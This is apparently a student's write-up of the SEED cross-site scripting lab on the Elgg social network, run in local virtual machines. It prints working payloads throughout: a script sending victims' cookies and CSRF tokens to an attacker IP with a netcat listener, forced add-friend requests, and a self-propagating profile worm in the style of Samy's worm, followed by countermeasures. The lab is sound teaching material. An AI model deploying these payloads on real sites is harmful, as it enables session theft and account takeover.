# *__XSS attack lab__*
---
### Brief
The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host the web application and there are a few users already created.
Logging in to the web app will be done from a different vm on the same virtual box network.

### Task 1 : Post a malicious message to display an alert window
The web app is hosted on seedubuntu vm and ubuntu vm is used to create a new account user11. To make the web app visible as a site named `www.xsslabelgg.com`, add a name and IP address parameter on the ubuntu vm's hosts file.
Log into the account `user11`. Go to about me section. This section allows adding 'about me' information to our profiles. By default the editor provided is a rich text editor which adds extra text to whatever is inside. This is counterproductive to the attack therefore this editor is removed and the plain text editor is used.
The section is used to add javascript code inside it -
```js
<script>alert('XSS');</script>
```
On saving this an alert is displayed on the page. The web app sees the text inside the box to show it o nthe browser but since it is a js code, it gets executed.
When some other user, say `alice`, tries to view the profile of `use11`, her webpage also gives the alert window.

### Task 2 : Posting a malicious message to display cookies
This is along the same lines as the previous task and does similar thing except the new code that is put inside the about me section now displays the cookie.
The new code is -
```js
<script>alert(document.cookie);</script>
```
This displays the cookie of `user11` when saved. On reloading too it does the same.
When a separate user say `alice` navigates to `user11`'s account, her own cookie gets displayed.
By design, the browser does not display the code, it runs it.

### Task 3 : Stealing cookies from the victim’s machine
This attack focuses on providing code in the 'about me' section such that the attacker can obtain the cookie without having to be preset when the account of `user11` is visited. For this the attacker injects a code that basically is a GET request for an image and also adds the cookie of the victim in the url itself.
```js
<script>document.write('<img src=http://192.168.56.4:1234?c='+escape(document.cookie)+'  >');</script>
```
The IP address for the http part is the attacker's IP address.
On the attacker machine we can listen o the specified port using netcat or any other means.
```bash
nc -l -p 1234
```
The next time someone on the web application, say `alice` visits the profile of `user11`, the code gets executed and the attacker gains the cookie for himself.
The nc output seems like -
```
GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```
The cookie starts after `%3D`.

### Task 4 : session hijacking using the stolen cookies
This task is about stealing the session of a legitimate user by using their cookie and then add the victim as a friend. To do this the process of adding a friend has to be known to the attacker. Therefore, the attacker creates another account say `samy`. This account can be added as a friend to `user11`'s account to observe the process of adding a friend. The attacker logs in to the account of `samy` and visits `user11`. Then he enables the inspect mode of the browser to watch the requests ad cookies as he adds `user11` as a friend to `samy`.
The friend addig process then shows a GET request -
```
http://www.xsslabelgg.com/action/friends/add?friend=43&__elgg_ts=152022381&__elgg_token=f0aaab1d9af23flb3lb876bfa5640cel
```
Also, the cookie is sent as a part of the request header.
Therefore, the 3 important things noted are -
1. the `friend=43` part which specifies the umber associated with the `user11` account.
2. the cookie sent as a part of request header.
3. the two parts `__elgg_ts` and `__elgg_token` which are tokens used as a countermeasure against the cross site request forgery attack.
The above have to be found and can also be found on the view-source page of the website.
The two tokens are stored in variables as mentioned above and since they are different for every web user, even if the attacker does not know the tokens of user `alice`, the name of the two token variables can be used to call the values. The response part for the request under inspect element can help locate these variables being used as - `elgg.security.token.__elgg_ts` and `elgg.security.token.__elgg_token`.
Using these variables, the attack code can be formed.
Use of cookie retrieval technique to retrieve the two tokens as well.
```js
<script>document.write('<img src=http://192.168.56.4:1234?c='+elgg.security.token.__elgg_ts+'&'+elgg.security.token.__elgg_token+'  >');</script>
```
The nc output seems like this -
```
GET /?c=1520227817&0fab54e97b2fa75c39d298de602a5939 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```
The tokens are separated by the `&`.
If the web app does not match passwords (or the case when we have the password of the intended victim), we can simply use a python script to use the authentication and use `requests` module to send a `GET` request and the attack will have been executed. The code will take the input from the nc command and the output of nc command can be split into sections to get the required cookies and the tokens. Then the script can be used to send a request to the desired link using the HTTPBasicAuth module and the cookies and parameters set along with the `GET` request. This can be used in cases when the script file we make is bigger than the allowed number of characters inside the text box that has the vulnerability.

To actually make other accounts execute the malicious code that can trigger them making the attacker their friend, the code needs to be in the same place where the previous codes to obtain cookie and the tokens were placed. This is the case when the password of the victim is not held with the attacker.

For this we can use the following code in javascript using AJAX and then store it into the 'about me' section of `user11`. The code is as follows -
```js
<script type="text/javascript">
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=43"+ts+token;
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/user11");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
</script>
```
This code forms the GET request to duplicate the add friend action of the web app. When the victim say `alice` views the homepage of the attacker `user11`, her browser will read this code and execute the javascript inside the tags. Since the user `alice` is logged in while the code is executed, the attack will run smoothly and `user11` will be added to the friend list of `alice`.

### Task 5 : Writing an XSS worm
This task is about coding a worm which can change the information of an account in the web app. This requires the analysis of changing the 'about me' section in the web app. The attacker `user11` uses the other account `samy` to update the 'about me' section to study the process. The 'inspect element' reveals that the process is a POST request which requires few parameters from the document. These parameters are specific to the session and the user, therefore, searching the parameters in the document, they are set as follows -
1. timestamp and token i.e., `__elgg_ts` and `__elgg_token` are stored in the document under `elgg.security.token` section in the html document.
2. user name of the session user is in JSON format variable called `elgg.session.user`.
3. guid of the session user is also in the `elgg.session.user` section.
4. the parameter `description` is the one that specifies what data is stored in the text field of the 'about me' section.
5. the `description` parameter has a control access field called `accesslevel[description]` which is 2 for private users, 1 for friends, 0 for others - has to be set to 2 always for changing the data in the 'about me' section.

The objective is to write a javascript code in the 'about me' section of `user11` such that when someone visits the profile of `user11`, the status as required by `user11` which is also set on his own account will be set on the account of the one who visits `user11`'s page. The javascript code must contain the post request required to proceed with the changing of the text in the 'about me' section. The code is as follows -
```js
<script type="text/javascript">
var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var ts=elgg.security.token__elgg_ts;
var token=elgg.security.token.__elgg_token;
ff=new XMLHttpRequest();
ff.open("POST",sendurl,true);
ff.setRequestHeader("Host","www.xsslabelgg.com");
ff.setRequestHeader("Keep-Alive","300");
ff.setRequestHeader("Connection","keep-alive");
ff.setRequestHeader("Cookie",document.cookie);
ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile"+elgg.session.user["username"]+"/edit");
params="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
ff.send(params);
```
The above code will first change the `user11`'s 'about me' portion to "User-11-is-great". Therefore, this will not affect others who view this profile. However, considering we have access to the server (the server has been hacked in our favor), then this script can be embedded in the server website hosting folder, from where it can be sourced like the image format to obtain the cookie and tokens. This way when any user visits the infected profile, the script will get loaded due to the image format js code in the infected profile.
Also, this method can be used to change the contents of a user by forming a request using python or any other programming language (assuming the authentication parameters are already with the attacker).
The best possible attack for a web app like this one which is vulnerable to XSS is using a proper worm i.e., self propagating worm.

### Task 6 : Creating a self propagating worm
The parts of adding the attacker as a friend as well as posting on the victim's account, without the victim's consent can be combined into one javascript code and then made self propagating.

The process of self propagating sees the following approach -
The code will have to be replicated by the code itself. This can be done by using the POST method as described in Task 5. The method to do the following is -
```js
<script id="daut" type="text/javascript">
var replicate="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML).concat("</").concat("script>");
...............
</script>
```
The breakup of `</` and `script>` is required as the browser may distinguish it as the ending tag for the first `<script>`.

This approach can be merged with the POST exploit to copy the required update and the code itself onto the victim's account. The transfer of all code and data in the web takes place through URLencoding in which `+` denotes a ` `. Therefore, instead of using `+` to add strings (concatenation), we use the `concat()` function. Also if there are any addition operations, they should be done using `a+b = a-(-b)` method.

The code clubbed with the POST exploit is as follows -
```js
<script id="daut" type="text/javascript">
var sp="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML).concat("</").concat("script>");
var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var ts=elgg.security.token__elgg_ts;
var token=elgg.security.token.__elgg_token;
ff=new XMLHttpRequest();
ff.open("POST",sendurl,true);
ff.setRequestHeader("Host","www.xsslabelgg.com");
ff.setRequestHeader("Keep-Alive","300");
ff.setRequestHeader("Connection","keep-alive");
ff.setRequestHeader("Cookie",document.cookie);
ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile".concat(elgg.session.user["username"]).concat("/edit"));
params="__elgg_ts=".concat(ts).concat("&__elgg_token=").concat(token).concat("&description=User-11-is-great").concat(escape(sp)).concat("&name=").concat(elgg.session.user["username"]).concat("&accesslevel[description]=2&guid=").concat(elgg.session.user["guid"]);
ff.send(params);
```
The `escape()` function converts the inner strings to URLencoding for http transfer. Now when a user views the profile of `user11`, the user's account will have its 'about me' section set to "User-11-is-great". Also the code itself will be copied to the user's page.
Also now since the code is in the user's page, whenever a user views the account of this user, the code will get executed and the new user will also have his account modified.
The add friend exploit can also e added to the above code as a new XMLHttpRequest part. That code will become the exact replica of the famous Samy's worm attack of 2005.

### Task 7 : Countermeasures
Elgg does have a built in countermeasures to defend against the XSS attack. The countermeasures have been deactivated and commented out to make the attack work. There is a custom built security plugin `HTMLawed` 1.8 on the Elgg web application which on activation, validates the user input and removes the tags from the input. This specific plugin is registered to the function `filter_tags` in the `elgg/ engine/lib/input.php` file.
To turn on the countermeasure, we login to the application as admin, goto administration -> plugins, and select security and spam in the dropdown menu. The `HTMLawed 1.8` plugin is below. This can now be activated.
In addition to this, there is another built-in PHP method called `htmlspecialchars()`, which is used to encode the special characters in the user input, such as encoding `"<"` to `&lt`, `">"` to `&gt`, etc. Go to the directory `elgg/views/default/output` and find the function call `htmlspecialchars` in `text.php`, `tagcloud.php`, `tags.php`, `access.php`, `tag.php`, `friendlytime.php`, `url.php`, `dropdown.php`, `email.php` and `confirmlink.php` files. Uncomment the corresponding `htmlspecialchars` function calls in each file.

The above was a detailed description of an XSS attack taking examples from the real world Samy's Worm attack.
